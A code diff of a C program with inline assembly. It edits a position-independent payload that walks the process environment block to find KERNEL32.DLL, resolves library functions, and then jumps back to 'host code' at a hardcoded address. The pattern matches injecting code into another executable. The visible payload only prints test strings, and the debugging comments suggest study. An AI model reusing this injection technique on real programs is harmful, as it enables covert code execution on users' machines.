@@ -46,19 +46,8 @@ int match_suffix(char *str, char* suffix) SET_SECT;
 
 int main()
 {
+    // asm ("jmp payload_enter");
     payload();
-    // asm ("payload_ret:");
-    // DWORD ret_addr = 0;
-    // asm volatile(
-    //     // "leal main, %%eax\n\t"
-    //     "leal payload_ret, %%ebx\n\t"
-    //     // "subl %%eax, %%ebx\n\t"
-    //     "movl %%ebx, %0\n\t"
-    //     :"=r" (ret_addr)
-    //     :
-    //     :"eax", "ebx"
-    // ); // 0x1018 0x401568 0x001568
-    // printf("%X\n", ret_addr);
     return 0;
 }
 
@@ -71,7 +60,7 @@ void payload(void)
         asm volatile ("movq %%gs:0x60, %0":"=r" (peb));
         list = &(peb->Ldr->InMemoryOrderModuleList);
     }
-    
+
     wchar_t kernel_32_name[] = L"KERNEL32.DLL";
     void *image_base = get_image_base(kernel_32_name, list);
 
@@ -161,16 +150,18 @@ const char empty_str[] = "";
 
     pFreeLibrary(msvcrt_hModule);
 // done
-
+// char s[] = "XX";
+// FUNCTION(puts)(s);
 // go back to host code
 // FUNCTION(puts)(empty_str);
     asm volatile (
         // "xor %%rax, %%rax\n\t"
         "key_label: \n\t"
-        "mov $0x00001568, %%rax\n\t" // ret
+        "mov $0x00001562, %%rax\n\t" // ret
         // "mov $0x000957C8, %%rax\n\t" // PE-bear
         // "mov $0x000014E0, %%rax\n\t"
-        "add %[base_addr], %%rax\n\t"
+        // "add %[base_addr], %%rax\n\t"
+        "add $0x00400000, %%rax\n\t"
         "jmp *%%rax"
         :
         :[base_addr] "r" (current_image_base)
